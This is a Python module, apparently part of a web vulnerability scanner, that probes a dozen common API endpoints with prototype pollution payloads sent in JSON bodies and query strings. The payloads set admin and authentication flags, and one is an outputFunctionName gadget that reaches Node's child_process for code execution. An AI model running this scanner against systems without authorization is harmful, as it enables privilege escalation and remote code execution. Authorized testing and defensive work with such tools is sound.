"""Advanced Prototype Pollution Scanner — deep prototype chain manipulation."""

import aiohttp
import asyncio
import json
from urllib.parse import urljoin
from modules.core import console

PROTO_PAYLOADS = [
    {'__proto__': {'polluted': True}},
    {'constructor': {'prototype': {'polluted': True}}},
    {'__proto__': {'isAdmin': True}},
    {'__proto__': {'role': 'admin'}},
    {'__proto__': {'toString': 'polluted'}},
    {'__proto__': {'status': 200}},
    {'constructor': {'prototype': {'isAuthenticated': True}}},
    {'__proto__': {'env': 'development'}},
    {'__proto__': {'debug': True}},
    {'__proto__': {'outputFunctionName': 'x;process.mainModule.require("child_process")'}},
]

QUERY_PAYLOADS = [
    '__proto__[polluted]=true',
    '__proto__.polluted=true',
    'constructor[prototype][polluted]=true',
    'constructor.prototype.polluted=true',
    '__proto__[isAdmin]=true',
    '__proto__[role]=admin',
]

INJECTION_ENDPOINTS = [
    '/api/user', '/api/settings', '/api/profile', '/api/config',
    '/api/update', '/api/merge', '/api/v1/user', '/api/v1/settings',
    '/login', '/register', '/signup', '/api/data',
]


async def _test_json_pollution(session, url, endpoint):
    """Test prototype pollution via JSON body."""
    findings = []
    test_url = urljoin(url, endpoint)

    for payload in PROTO_PAYLOADS:
        try:
            async with session.post(test_url, json=payload,
                                    timeout=aiohttp.ClientTimeout(total=8),
                                    ssl=False) as resp:
                body = await resp.text()

                if resp.status in (200, 201):
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict):
                            if data.get('polluted') or data.get('isAdmin') or data.get('role') == 'admin':
                                findings.append({
                                    'type': 'Prototype Pollution (JSON)',
                                    'endpoint': endpoint,
                                    'payload': str(payload)[:60],
                                    'severity': 'Critical',
                                    'detail': 'Polluted property appeared in response',
                                })
                    except Exception:
                        pass

                if 'polluted' in body and 'true' in body.lower():
                    findings.append({
                        'type': 'Prototype Pollution Reflection',
                        'endpoint': endpoint,
                        'severity': 'High',
                    })

        except Exception:
            pass

    return findings


async def _test_query_pollution(session, url, endpoint):
    """Test prototype pollution via query string."""
    findings = []
    test_url = urljoin(url, endpoint)

    for payload in QUERY_PAYLOADS:
        try:
            full_url = f"{test_url}?{payload}"
            async with session.get(full_url, timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=False) as resp:
                body = await resp.text()

                if 'polluted' in body and 'true' in body.lower():
                    findings.append({
                        'type': 'Prototype Pollution (Query)',
                        'endpoint': endpoint,
                        'payload': payload[:60],
                        'severity': 'Critical',
                    })

                if resp.status == 500:
                    findings.append({
                        'type': 'Prototype Pollution Error',
                        'endpoint': endpoint,
                        'payload': payload[:60],
                        'severity': 'Medium',
                    })
        except Exception:
            pass

    return findings


async def scan_proto_pollution(session, url):
    """Advanced prototype pollution scanning."""
    console.print(f"\n[bold cyan]--- Prototype Pollution Deep Scanner ---[/bold cyan]")
    console.print(f"  [cyan]Testing {len(INJECTION_ENDPOINTS)} endpoints x {len(PROTO_PAYLOADS)+len(QUERY_PAYLOADS)} payloads...[/cyan]")

    all_findings = []

    for endpoint in INJECTION_ENDPOINTS:
        json_findings = await _test_json_pollution(session, url, endpoint)
        all_findings.extend(json_findings)
        for f in json_findings:
            console.print(f"  [bold red]⚠ {f['type']}: {f['endpoint']}[/bold red]")

        query_findings = await _test_query_pollution(session, url, endpoint)
        all_findings.extend(query_findings)
        for f in query_findings:
            console.print(f"  [red]{f['type']}: {f['endpoint']}[/red]")

        await asyncio.sleep(0.05)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} prototype pollution vectors![/bold red]")
    else:
        console.print(f"\n  [green]✓ No prototype pollution detected[/green]")

    return {'findings': all_findings}
